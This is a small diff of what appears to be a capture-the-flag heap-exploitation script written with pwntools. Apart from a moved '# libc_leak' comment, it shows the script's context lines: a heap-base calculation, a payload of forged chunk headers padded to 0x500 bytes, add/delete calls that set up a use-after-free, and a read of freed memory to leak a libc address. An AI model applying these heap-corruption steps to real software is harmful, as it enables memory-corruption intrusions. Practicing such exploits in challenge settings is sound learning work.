@@ -82,6 +82,7 @@ heap_base = decrypt(x) - 80976
 print("heap_base: ", hex(heap_base))
 
 
+# libc_leak
 payload = p64(0x0) + p64(0x21) + b"HOFEFUGA" * 2
 payload = payload * 60
 payload += b"A" * (0x500 - len(payload))
@@ -90,7 +91,6 @@ add("G" * 0x70)
 delete(9)
 delete(8)
 
-# libc_leak
 l = show(8)
 x = l[:8]
 x = u64(x)
